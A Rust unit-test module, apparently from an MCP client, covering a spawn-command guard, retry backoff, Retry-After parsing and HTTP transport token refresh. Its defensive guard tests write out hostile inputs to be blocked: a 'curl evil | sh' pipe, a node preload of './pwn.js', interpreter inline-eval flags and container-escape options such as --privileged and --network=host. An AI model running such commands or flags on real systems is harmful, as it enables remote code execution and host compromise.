        assert!(screen_spawn_command("docker", &argv(&["run", "-i", "--rm", "ghcr.io/x/y"])).is_ok());
        // Non-host docker network must NOT be a false positive.
        assert!(screen_spawn_command("docker", &argv(&["run", "--network", "mynet", "img"])).is_ok());
        // A plain binary server.
        assert!(screen_spawn_command("/usr/local/bin/my-mcp", &argv(&["--stdio"])).is_ok());
    }

    #[test]
    fn spawn_guard_blocks_interpreter_inline_eval() {
        assert!(screen_spawn_command("node", &argv(&["-e", "require('child_process')"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["--eval", "x"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["--require", "./pwn.js", "server.js"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["--import=./pwn.js", "server.js"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["eval", "-e", "x"])).is_err());
        assert!(screen_spawn_command("python", &argv(&["-c", "import os"])).is_err());
        assert!(screen_spawn_command("ruby", &argv(&["-e", "x"])).is_err());
        assert!(screen_spawn_command("bash", &argv(&["-c", "curl evil | sh"])).is_err());
        assert!(screen_spawn_command("sh", &argv(&["-c", "x"])).is_err());
        assert!(screen_spawn_command("pwsh", &argv(&["-Command", "x"])).is_err());
    }

    #[test]
    fn spawn_guard_blocks_container_escape() {
        // Privilege escalation beyond a normal host process is blocked.
        assert!(screen_spawn_command("docker", &argv(&["run", "--privileged", "img"])).is_err());
        assert!(screen_spawn_command("podman", &argv(&["run", "--cap-add", "SYS_ADMIN", "img"])).is_err());
        assert!(screen_spawn_command("docker", &argv(&["run", "--device", "/dev/kmsg", "img"])).is_err());
        // Host namespaces in both `=host` and space forms.
        assert!(screen_spawn_command("docker", &argv(&["run", "--network=host", "img"])).is_err());
        assert!(screen_spawn_command("docker", &argv(&["run", "--pid", "host", "img"])).is_err());
    }

    #[test]
    fn spawn_guard_allows_docker_volume_mounts() {
        // A plain host mount is NOT an escalation beyond the full host access npx/binary
        // servers already have, so it must not false-positive on legit docker servers.
        assert!(screen_spawn_command("docker", &argv(&["run", "-v", "/data:/data", "img"])).is_ok());
        assert!(screen_spawn_command("docker", &argv(&["run", "--volume", "/data:/data", "img"])).is_ok());
        assert!(screen_spawn_command("docker", &argv(&["run", "--mount", "type=bind,src=/data,dst=/d", "img"])).is_ok());
    }

    #[test]
    fn spawn_guard_is_case_and_path_insensitive() {
        // A full path and odd casing must still resolve to the interpreter name.
        assert!(screen_spawn_command("/usr/bin/node", &argv(&["-e", "x"])).is_err());
        assert!(screen_spawn_command("C:\\Program Files\\nodejs\\NODE.EXE", &argv(&["-E", "x"])).is_err());
        // A non-interpreter that merely has a `-e`-looking arg is untouched.
        assert!(screen_spawn_command("my-server", &argv(&["-e", "value"])).is_ok());
    }

    #[test]
    #[cfg(windows)]
    fn resolves_bare_command_via_pathext() {
        // `cmd` is always on PATH on Windows; it should resolve to a real file.
        let resolved = resolve_command("cmd");
        assert!(
            resolved.to_lowercase().ends_with("cmd.exe"),
            "expected cmd.exe, got {resolved}"
        );
    }

    #[test]
    fn backoff_doubles_and_caps() {
        use super::{backoff_delay, HTTP_RETRY_BASE, HTTP_RETRY_CAP};
        assert_eq!(backoff_delay(0), HTTP_RETRY_BASE);
        assert_eq!(backoff_delay(1), HTTP_RETRY_BASE * 2);
        assert_eq!(backoff_delay(2), HTTP_RETRY_BASE * 4);
        // Large attempts saturate at the cap, never overflow.
        assert_eq!(backoff_delay(30), HTTP_RETRY_CAP);
    }

    #[test]
    fn retry_after_parses_delta_seconds_and_caps() {
        use super::{retry_after_delay, HTTP_RETRY_CAP};
        use std::time::Duration;
        assert_eq!(retry_after_delay("2"), Some(Duration::from_secs(2)));
        assert_eq!(retry_after_delay("  5 "), Some(Duration::from_secs(5)));
        // Over the cap is clamped to the cap.
        assert_eq!(retry_after_delay("9999"), Some(HTTP_RETRY_CAP));
        // HTTP-date form and junk are not delta-seconds: no delay parsed.
        assert_eq!(retry_after_delay("Wed, 21 Oct 2026 07:28:00 GMT"), None);
        assert_eq!(retry_after_delay(""), None);
    }

    #[test]
    fn bearer_header_adds_scheme_once() {
        assert_eq!(super::bearer_header("sk-123"), "Bearer sk-123");
        assert_eq!(super::bearer_header("Bearer sk-123"), "Bearer sk-123");
        assert_eq!(super::bearer_header("bearer sk-123"), "bearer sk-123");
    }

    #[test]
    fn ids_match_tolerates_number_vs_string() {
        use super::ids_match;
        use serde_json::json;
        assert!(ids_match(Some(&json!(1)), Some(&json!(1))));
        // A server that echoes the numeric id as a string still matches.
        assert!(ids_match(Some(&json!("1")), Some(&json!(1))));
        assert!(ids_match(Some(&json!(1)), Some(&json!("1"))));
        assert!(!ids_match(Some(&json!(2)), Some(&json!(1))));
        // No id requested -> take the first message.
        assert!(ids_match(Some(&json!(1)), None));
        // Wanted an id but the message has none -> no match.
        assert!(!ids_match(None, Some(&json!(1))));
    }

    #[test]
    fn recognizes_a_tools_list_changed_notification() {
        use super::is_list_changed;
        assert!(is_list_changed(
            r#"{"jsonrpc":"2.0","method":"notifications/tools/list_changed"}"#
        ));
        assert!(is_list_changed(
            "  {\"jsonrpc\":\"2.0\",\"method\":\"notifications/tools/list_changed\"}\n"
        ));
        // A response to our own tools/list call is not the notification.
        assert!(!is_list_changed(r#"{"jsonrpc":"2.0","id":3,"result":{"tools":[]}}"#));
        // Other notifications and unrelated lines are ignored (and skip the parse).
        assert!(!is_list_changed(
            r#"{"jsonrpc":"2.0","method":"notifications/message","params":{}}"#
        ));
        assert!(!is_list_changed("not json at all"));
        assert!(!is_list_changed(""));
    }

    #[test]
    fn forward_line_flags_dirty_only_when_armed() {
        use super::forward_line;
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;

        let notif = r#"{"jsonrpc":"2.0","method":"notifications/tools/list_changed"}"#;
        let dirty = Some(Arc::new(AtomicBool::new(false)));
        let armed = Arc::new(AtomicBool::new(false));
        let (tx, rx) = std::sync::mpsc::channel();

        // Unarmed (still in the handshake window): the line is forwarded but the
        // change is not acted on.
        assert!(forward_line(notif.to_string(), &tx, &dirty, &armed));
        assert!(!dirty.as_ref().unwrap().load(Ordering::SeqCst));
        assert_eq!(rx.recv().unwrap(), notif);

        // Armed: the same notification now flips the dirty flag.
        armed.store(true, Ordering::SeqCst);
        assert!(forward_line(notif.to_string(), &tx, &dirty, &armed));
        assert!(dirty.as_ref().unwrap().load(Ordering::SeqCst));
        assert_eq!(rx.recv().unwrap(), notif);

        // An ordinary line is always forwarded and never flags a change.
        let resp = r#"{"jsonrpc":"2.0","id":1,"result":{}}"#;
        let dirty2 = Some(Arc::new(AtomicBool::new(false)));
        assert!(forward_line(resp.to_string(), &tx, &dirty2, &armed));
        assert!(!dirty2.as_ref().unwrap().load(Ordering::SeqCst));
        assert_eq!(rx.recv().unwrap(), resp);

        // A closed receiver makes forward_line report "stop".
        drop(rx);
        assert!(!forward_line(notif.to_string(), &tx, &dirty, &armed));
    }

    #[test]
    fn post_refreshes_token_and_retries_on_401() {
        use super::{HttpTransport, RefreshFn};
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::{Arc, Mutex};

        // Mock MCP server: 401 on the first POST (token expired), 200 JSON-RPC on
        // the retry. Record the Authorization header on the second request.
        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let retry_auth = Arc::new(Mutex::new(String::new()));
        let hits = Arc::new(AtomicUsize::new(0));
        let (ra, hc) = (Arc::clone(&retry_auth), Arc::clone(&hits));
        let handle = std::thread::spawn(move || {
            for _ in 0..2 {
                let req = match server.recv() {
                    Ok(r) => r,
                    Err(_) => return,
                };
                let auth = req
                    .headers()
                    .iter()
                    .find(|h| h.field.equiv("Authorization"))
                    .map(|h| h.value.as_str().to_string())
                    .unwrap_or_default();
                if hc.fetch_add(1, Ordering::SeqCst) == 0 {
                    let _ = req.respond(
                        tiny_http::Response::from_string("unauthorized").with_status_code(401),
                    );
                } else {
                    *ra.lock().unwrap() = auth;
                    let ct =
                        tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
                            .unwrap();
                    let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
                    let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
                }
            }
        });

        let url = format!("http://127.0.0.1:{port}/");
        let refresh: Option<RefreshFn> = Some(Box::new(|| Some("fresh".to_string())));
        let mut t = HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
        let res = t
            .post(&serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }), true)
            .expect("post should succeed after the token refresh");
        handle.join().unwrap();

        assert!(res.is_some(), "got the 200 result after refreshing");
        assert_eq!(hits.load(Ordering::SeqCst), 2, "exactly one 401 then one retry");
        assert_eq!(*retry_auth.lock().unwrap(), "Bearer fresh", "retry used the new token");
    }

    #[test]
    fn post_returns_retry_on_429_with_retry_after() {
        use super::{HttpTransport, TransportError};
        use std::sync::Arc;
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::time::Duration;

        // Mock MCP server: 429 with Retry-After: 2 on the first request,
        // 200 JSON-RPC on the second.
        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let hits = Arc::new(AtomicUsize::new(0));
        let hc = Arc::clone(&hits);
        let handle = std::thread::spawn(move || {
            for _ in 0..2 {
                let req = match server.recv() {
                    Ok(r) => r,
                    Err(_) => return,
                };
                if hc.fetch_add(1, Ordering::SeqCst) == 0 {
                    let ra = tiny_http::Header::from_bytes(&b"Retry-After"[..], &b"2"[..]).unwrap();
                    let _ = req.respond(
                        tiny_http::Response::from_string("rate limited")
                            .with_status_code(429)
                            .with_header(ra),
                    );
                } else {
                    let ct = tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..]).unwrap();
                    let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
                    let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
                }
            }
        });

        let url = format!("http://127.0.0.1:{port}/");
        let mut t = HttpTransport::new(&url);

        // First call: should get a Retry signal, NOT an Ok or Fatal.
        let result = t.post(&serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }), true);
        match &result {
            Err(TransportError::Retry { retry_after, .. }) => {
                assert_eq!(*retry_after, Some(Duration::from_secs(2)));
            }
            other => panic!("expected TransportError::Retry, got {other:?}"),
        }

        // Second call: the server now responds 200.
        let result2 = t.post(&serde_json::json!({ "jsonrpc": "2.0", "id": 2, "method": "ping" }), true);
        assert!(result2.is_ok(), "second call should succeed: {result2:?}");
        assert_eq!(hits.load(Ordering::SeqCst), 2);

        handle.join().unwrap();
    }

    #[test]
    fn post_returns_retry_on_transport_error() {
        use super::{HttpTransport, TransportError};

        // A dead port: connection refused, which is a retryable transport error.
        let mut t = HttpTransport::new("http://127.0.0.1:1/");
        let result = t.post(&serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }), true);
        match &result {
            Err(TransportError::Retry { retry_after, .. }) => {
                assert!(retry_after.is_none());
            }
            Err(TransportError::Fatal(msg)) => {
                // On some systems port 1 may produce a different error class.
                eprintln!("got Fatal instead of Retry (OS-dependent): {msg}");
            }
            other => panic!("expected Retry or Fatal, got {other:?}"),
        }
    }
}
